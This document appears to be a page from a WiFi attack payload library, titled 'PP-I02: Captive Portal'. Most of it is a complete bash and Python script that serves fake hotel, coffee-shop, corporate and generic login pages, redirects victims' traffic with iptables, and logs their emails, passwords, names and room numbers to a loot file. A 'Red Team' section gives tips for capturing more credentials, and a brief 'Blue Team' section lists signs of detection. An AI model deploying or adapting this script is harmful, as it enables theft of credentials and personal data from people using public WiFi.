# PP-I02: Captive Portal

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I02 |
| **Name** | Captive Portal |
| **Difficulty** | Intermediate |
| **Type** | Attack |
| **Purpose** | Credential harvesting portal |
| **MITRE ATT&CK** | T1556 (Modify Authentication Process), T1557 (Adversary-in-the-Middle) |

## What This Payload Does

Creates a fake login portal that captures credentials when victims connect to the Evil Twin. Mimics common WiFi login pages (hotel, café, corporate guest networks).

---

## Understanding Captive Portals

```
┌─────────────────────────────────────────────────────────────┐
│              CAPTIVE PORTAL ATTACK FLOW                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   1. VICTIM CONNECTS TO EVIL TWIN                           │
│      └── Receives IP via DHCP (DNS = attacker)              │
│                                                              │
│   2. VICTIM OPENS BROWSER                                   │
│      └── Any website triggers portal                        │
│      └── Connectivity check fails → portal appears          │
│                                                              │
│   3. DNS HIJACKING                                          │
│      └── All DNS → attacker IP                              │
│      └── HTTP requests → captive portal                     │
│                                                              │
│   4. FAKE LOGIN PAGE                                        │
│      └── Mimics expected portal (hotel, airline, etc.)      │
│      └── Asks for email/password or social login            │
│                                                              │
│   5. CREDENTIAL CAPTURE                                     │
│      └── Credentials logged to file                         │
│      └── Victim redirected to internet                      │
│                                                              │
│   6. POST-CAPTURE                                           │
│      └── Allow internet access to avoid suspicion           │
│      └── Continue monitoring traffic                        │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I02
# Name: Captive Portal
# Description: Credential harvesting portal
# Author: Security Training
# WARNING: Only use with explicit authorization!
#

# ============================================
# CONFIGURATION
# ============================================
AP_INTERFACE="wlan0"
INTERNET_INTERFACE="eth0"
PORTAL_PORT=80
GATEWAY_IP="192.168.4.1"

LOOT_DIR="/sd/loot/portal"
LOG_FILE="/tmp/pp-i02.log"
CREDS_FILE="$LOOT_DIR/credentials.txt"
PORTAL_DIR="/tmp/portal"

# Portal template
PORTAL_TEMPLATE="generic"  # Options: generic, hotel, coffee, corporate

# ============================================
# FUNCTIONS
# ============================================
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Cleaning up..."

    # Stop web server
    killall python3 python 2>/dev/null

    # Restore iptables
    iptables -t nat -F
    iptables -F FORWARD
    iptables -F INPUT

    log "Portal stopped"
    exit 0
}

trap cleanup SIGINT SIGTERM

# ============================================
# CREATE PORTAL PAGES
# ============================================
create_portal() {
    local template="$1"

    mkdir -p "$PORTAL_DIR"

    case "$template" in
        generic)
            create_generic_portal
            ;;
        hotel)
            create_hotel_portal
            ;;
        coffee)
            create_coffee_portal
            ;;
        corporate)
            create_corporate_portal
            ;;
        *)
            create_generic_portal
            ;;
    esac

    # Create capture script
    create_capture_script
}

create_generic_portal() {
    cat > "$PORTAL_DIR/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            width: 90%;
            max-width: 400px;
        }
        h1 { color: #333; margin-bottom: 10px; text-align: center; }
        p { color: #666; margin-bottom: 30px; text-align: center; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #333; margin-bottom: 8px; font-weight: 500; }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e1e1;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus { border-color: #667eea; outline: none; }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px); }
        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🌐 Free WiFi</h1>
        <p>Sign in to continue browsing</p>
        <form action="/capture" method="POST">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email" required placeholder="your@email.com">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required placeholder="••••••••">
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
        <p class="terms">By connecting, you agree to our Terms of Service</p>
    </div>
</body>
</html>
HTMLEOF
}

create_hotel_portal() {
    cat > "$PORTAL_DIR/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotel Guest WiFi</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Georgia', serif;
            background: #f5f5f5;
            min-height: 100vh;
        }
        .header {
            background: #1a365d;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 { font-size: 28px; }
        .container {
            max-width: 500px;
            margin: 30px auto;
            padding: 30px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h2 { color: #1a365d; margin-bottom: 20px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #333; }
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #c9a227;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover { background: #b8911f; }
        .note { color: #666; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🏨 Grand Hotel</h1>
        <p>Guest WiFi Portal</p>
    </div>
    <div class="container">
        <h2>Welcome, Guest</h2>
        <p>Please enter your details to access complimentary WiFi</p>
        <form action="/capture" method="POST">
            <div class="form-group">
                <label>Room Number</label>
                <input type="text" name="room" required placeholder="e.g., 412">
            </div>
            <div class="form-group">
                <label>Last Name</label>
                <input type="text" name="lastname" required placeholder="As on reservation">
            </div>
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email" required placeholder="For confirmation">
            </div>
            <button type="submit">Access WiFi</button>
        </form>
        <p class="note">Need assistance? Call Front Desk at ext. 0</p>
    </div>
</body>
</html>
HTMLEOF
}

create_coffee_portal() {
    cat > "$PORTAL_DIR/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coffee Shop WiFi</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Helvetica Neue', sans-serif;
            background: #f8f4f0;
            min-height: 100vh;
        }
        .header {
            background: #1e3932;
            color: white;
            padding: 30px;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 10px; }
        .container {
            max-width: 450px;
            margin: 30px auto;
            padding: 30px;
            background: white;
            border-radius: 10px;
        }
        h2 { color: #1e3932; margin-bottom: 10px; }
        .subtitle { color: #666; margin-bottom: 25px; }
        .social-btn {
            display: block;
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 25px;
            text-align: center;
            text-decoration: none;
            color: #333;
            font-size: 16px;
        }
        .social-btn:hover { background: #f5f5f5; }
        .divider {
            text-align: center;
            margin: 20px 0;
            color: #999;
        }
        .form-group { margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 25px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #1e3932;
            border: none;
            border-radius: 25px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">☕</div>
        <h1>Bean & Brew</h1>
    </div>
    <div class="container">
        <h2>Stay Connected</h2>
        <p class="subtitle">Sign in for free WiFi</p>

        <a href="/capture?provider=google" class="social-btn">
            📧 Continue with Google
        </a>
        <a href="/capture?provider=facebook" class="social-btn">
            📘 Continue with Facebook
        </a>

        <div class="divider">— or —</div>

        <form action="/capture" method="POST">
            <div class="form-group">
                <input type="email" name="email" required placeholder="Email address">
            </div>
            <button type="submit">Get Free WiFi</button>
        </form>
    </div>
</body>
</html>
HTMLEOF
}

create_corporate_portal() {
    cat > "$PORTAL_DIR/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Corporate Guest Network</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
        }
        .header {
            background: #0078d4;
            color: white;
            padding: 15px 30px;
        }
        .header h1 { font-size: 20px; font-weight: 400; }
        .container {
            max-width: 450px;
            margin: 50px auto;
            padding: 40px;
            background: white;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
        }
        h2 { color: #333; margin-bottom: 5px; font-weight: 600; }
        .subtitle { color: #666; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #333; font-size: 14px; }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            font-size: 14px;
        }
        input:focus { border-color: #0078d4; outline: none; }
        button {
            padding: 10px 20px;
            background: #0078d4;
            border: none;
            color: white;
            font-size: 14px;
            cursor: pointer;
        }
        .info {
            margin-top: 30px;
            padding: 15px;
            background: #f5f5f5;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🏢 Acme Corporation</h1>
    </div>
    <div class="container">
        <h2>Guest Network Access</h2>
        <p class="subtitle">Please authenticate to continue</p>

        <form action="/capture" method="POST">
            <div class="form-group">
                <label>Corporate Email</label>
                <input type="email" name="email" required placeholder="user@company.com">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <div class="form-group">
                <label>Sponsor Name (Employee)</label>
                <input type="text" name="sponsor" placeholder="Who invited you?">
            </div>
            <button type="submit">Sign In</button>
        </form>

        <div class="info">
            <strong>IT Support:</strong> helpdesk@acme.com | ext. 5555
        </div>
    </div>
</body>
</html>
HTMLEOF
}

create_capture_script() {
    # Success page
    cat > "$PORTAL_DIR/success.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Connected!</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #f0f0f0;
            text-align: center;
        }
        .container { background: white; padding: 50px; border-radius: 10px; }
        h1 { color: #28a745; margin-bottom: 20px; }
        p { color: #666; }
    </style>
    <script>setTimeout(function(){ window.location = 'http://www.google.com'; }, 3000);</script>
</head>
<body>
    <div class="container">
        <h1>✓ Connected!</h1>
        <p>You now have internet access.<br>Redirecting...</p>
    </div>
</body>
</html>
HTMLEOF

    # Python capture server
    cat > "$PORTAL_DIR/server.py" << PYEOF
#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import os
from datetime import datetime

PORT = $PORTAL_PORT
CREDS_FILE = "$CREDS_FILE"
PORTAL_DIR = "$PORTAL_DIR"

class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=PORTAL_DIR, **kwargs)

    def do_GET(self):
        # Redirect all GETs to portal
        if self.path == "/" or self.path == "/index.html":
            super().do_GET()
        elif self.path == "/success.html":
            super().do_GET()
        elif self.path.startswith("/capture"):
            # Handle social login clicks
            params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            if params:
                self.log_credentials(params)
            self.send_response(302)
            self.send_header('Location', '/success.html')
            self.end_headers()
        else:
            # Redirect everything else to index
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)

        # Log credentials
        self.log_credentials(params)

        # Redirect to success
        self.send_response(302)
        self.send_header('Location', '/success.html')
        self.end_headers()

    def log_credentials(self, params):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        client_ip = self.client_address[0]

        # Flatten params
        data = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}

        log_entry = f"[{timestamp}] IP: {client_ip} | Data: {data}\n"

        print(f"\\n{'='*50}")
        print("CREDENTIALS CAPTURED!")
        print(f"{'='*50}")
        print(log_entry)

        with open(CREDS_FILE, 'a') as f:
            f.write(log_entry)

with socketserver.TCPServer(("", PORT), CaptiveHandler) as httpd:
    print(f"Captive portal running on port {PORT}")
    httpd.serve_forever()
PYEOF
}

# ============================================
# MAIN
# ============================================
log "Starting PP-I02: Captive Portal"

mkdir -p "$LOOT_DIR"

# Create portal files
log "Creating portal template: $PORTAL_TEMPLATE"
create_portal "$PORTAL_TEMPLATE"

# Configure iptables for captive portal
log "Configuring iptables redirect..."

# Redirect all HTTP to portal
iptables -t nat -A PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port $PORTAL_PORT

# Redirect DNS
iptables -t nat -A PREROUTING -i "$AP_INTERFACE" -p udp --dport 53 -j REDIRECT --to-port 53

# Allow established connections out
iptables -A FORWARD -i "$AP_INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT
iptables -A FORWARD -i "$INTERNET_INTERFACE" -o "$AP_INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

# Start web server
log "Starting captive portal server..."
cd "$PORTAL_DIR"
python3 "$PORTAL_DIR/server.py" &
SERVER_PID=$!

sleep 2

if ! kill -0 $SERVER_PID 2>/dev/null; then
    log "ERROR: Web server failed to start"
    cleanup
fi

log "Portal started on port $PORTAL_PORT"

echo ""
echo "╔════════════════════════════════════════════════════╗"
echo "║         CAPTIVE PORTAL ACTIVE                      ║"
echo "╠════════════════════════════════════════════════════╣"
echo "║  Template:  $PORTAL_TEMPLATE"
echo "║  Port:      $PORTAL_PORT"
echo "║  Creds:     $CREDS_FILE"
echo "╚════════════════════════════════════════════════════╝"
echo ""
echo "Waiting for credentials..."
echo "Press Ctrl+C to stop"

# Monitor credentials file
tail -f "$CREDS_FILE" 2>/dev/null &

wait $SERVER_PID
```

---

## Red Team Perspective

### Maximizing Capture Rate
1. **Match expectations** - Hotel portal for hotel WiFi
2. **Professional design** - Sloppy pages raise suspicion
3. **Minimal fields** - Only ask for what's believable
4. **Quick redirect** - Don't make them wait

### Credential Value
| Field | Intelligence Value |
|-------|-------------------|
| Email | Personal/corporate identity |
| Password | Credential reuse potential |
| Room number | Physical location |
| Name | Personal identification |
| Company | Corporate targeting |

---

## Blue Team Perspective

### Detection
- Unexpected captive portal triggers
- Certificate warnings on HTTPS
- Different portal appearance than expected
- Unusual login field requests

### User Education
- Verify portal legitimacy before entering credentials
- Never use real passwords on public WiFi portals
- Use VPN before connecting to public networks
- Check for HTTPS and valid certificates

---

## Payload File

Save as `PP-I02_Captive_Portal.sh`:

```bash
#!/bin/bash
# PP-I02: Captive Portal (Compact)
# Requires Evil Twin running first
mkdir -p /tmp/portal /sd/loot/portal
# Create simple portal page inline
echo '<form action="/c" method="POST"><input name="email" placeholder="Email"><input name="pass" type="password" placeholder="Password"><button>Connect</button></form>' > /tmp/portal/index.html
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
cd /tmp/portal && python3 -m http.server 8080
```

---

[← PP-I01 Evil Twin](PP-I01_Evil_Twin.md) | [Back to Intermediate](README.md) | [Next: PP-I03 KARMA Attack →](PP-I03_KARMA_Attack.md)
